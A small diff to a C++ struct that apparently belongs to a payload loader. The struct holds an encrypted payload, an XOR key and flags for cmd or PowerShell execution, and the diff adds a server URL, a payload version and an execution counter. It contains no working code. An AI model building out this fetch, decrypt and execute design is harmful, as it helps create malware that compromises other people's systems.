@@ -23,10 +23,13 @@ struct Storage
 	std::string EncryptedPayload;
 	std::string DecryptedPayload;
 	std::string XorKey;
-	std::string LastPayload;
+	std::string ServerURL;
+	std::string PayloadVersion;
 
 	bool CmdPayload = false;
 	bool PowerShellPayload = false;
+	int	ExecutedTimes = 0;
+
 
 };
 
